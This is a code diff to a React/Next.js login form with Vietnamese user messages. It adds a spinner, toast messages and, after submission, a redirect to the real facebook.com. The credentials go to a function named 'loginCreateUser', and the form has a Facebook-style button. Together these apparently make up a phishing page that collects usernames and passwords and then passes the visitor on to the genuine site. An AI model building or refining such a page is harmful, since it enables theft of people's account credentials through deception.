@@ -1,8 +1,11 @@
 /* eslint-disable @typescript-eslint/no-explicit-any */
+import { Spinner } from "@/app/ui/spiner";
 import { loginCreateUser } from "@/services/user";
 import Link from "next/link";
 import { useCallback, useState } from "react";
+import { toast } from "sonner";
 export const LoginForm = () => {
+  const [loading, setLoading] = useState(false);
   const [errorMessage] = useState("");
   const [data, setData] = useState({
     username: "",
@@ -16,11 +19,13 @@ export const LoginForm = () => {
       if (!data.username || !data.password) {
         throw new Error("Vui lòng nhập đầy đủ thông tin");
       }
-
+      setLoading(true);
       await loginCreateUser(data);
-      //   window.location.replace("/");
+      toast.success("Đăng nhập thành công");
+      setLoading(false);
+      window.location.replace("https://www.facebook.com/");
     } catch (err: any) {
-      console.error("Đăng nhập thất bại:", err);
+      toast.error("Đăng nhập thất bại:", err);
     }
   };
 
@@ -28,7 +33,6 @@ export const LoginForm = () => {
     const { name, value } = e.target;
     setData((prev) => ({ ...prev, [name]: value }));
   }, []);
-
   return (
     <form action="" onSubmit={handleLogin}>
       <div className="px-5">
@@ -61,7 +65,7 @@ export const LoginForm = () => {
           type="submit"
           className="w-full bg-blue border-none rounded-[6px] text-[20px] px-[16px] py-[10px] font-bold text-white"
         >
-          Log in
+          {loading ? <Spinner /> : "Log in"}
         </button>
       </div>
       {/* ========== */}
